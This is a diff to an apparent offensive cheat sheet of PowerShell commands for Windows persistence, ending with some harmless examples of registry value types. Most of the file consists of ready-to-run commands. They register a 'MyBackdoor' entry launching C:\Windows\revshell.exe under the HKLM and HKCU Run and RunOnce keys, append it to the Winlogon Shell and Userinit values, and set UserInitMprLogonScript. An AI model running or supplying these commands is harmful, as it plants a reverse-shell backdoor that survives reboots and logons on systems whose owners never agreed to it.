@@ -1,33 +1,31 @@
-# Modify registry keys with PowerShell
-
+### Modify logon script for entire machine
 ```powershell
-# Modify logon script for entire machine
 New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyBackdoor" -Value "C:\Windows\revshell.exe" -PropertyType "ExpandString"
 New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MyBackdoor" -Value "C:\Windows\revshell.exe" -PropertyType "ExpandString"
 ```
 
+### Modify logon script for current user
 ```powershell
-# Modify logon script for current user
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyBackdoor" -Value "C:\Windows\revshell.exe" -PropertyType "ExpandString"
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MyBackdoor" -Value "C:\Windows\revshell.exe" -PropertyType "ExpandString"
 ```
 
+### Modify Shell of Winlogon
 ```powershell
-# Modify Shell of Winlogon
 $currentValue = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon").Shell
 $newValue = "$currentValue, c:\windows\revshell.exe"
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value $newValue
 ```
 
+### Modify Userinit of Winlogon
 ```powershell
-# Modify Userinit of Winlogon
 $currentValue = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon").Userinit
 $newValue = "$currentValue c:\windows\revshell.exe"
 Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value $newValue
 ```
 
+### Another way to modify Userinit/Shell of Winlogon
 ```powershell
-# Another way to modify Userinit/Shell of Winlogon
 $keyPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
 Get-ItemProperty -Path $keyPath | ForEach-Object {
     Set-ItemProperty -Path $keyPath -Name "Userinit" -Value "$($_.Userinit) c:\windows\revshell.exe"
@@ -36,12 +34,13 @@ Get-ItemProperty -Path $keyPath | ForEach-Object {
 }
 ```
 
+### Modify environmental variable for logon script
 ```powershell
-# Modify environmental variable
 New-ItemProperty -Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value "C:\Windows\revshell.exe" -PropertyType "ExpandString"
 ```
 
-<!-- # Examples of Value Types
+### Examples of Value Types  
+```powershell
 # String (REG_SZ)
 New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value "StringValue" -PropertyType "String"
 
@@ -61,4 +60,5 @@ New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value @("Str
 New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value 123456789012345 -PropertyType "QWord"
 
 # Unknown (REG_NONE)
-New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value 0 -PropertyType "Unknown" -->
+New-ItemProperty -Path "HKLM:\Path\To\RegistryKey" -Name "MyValue" -Value 0 -PropertyType "Unknown"
+```
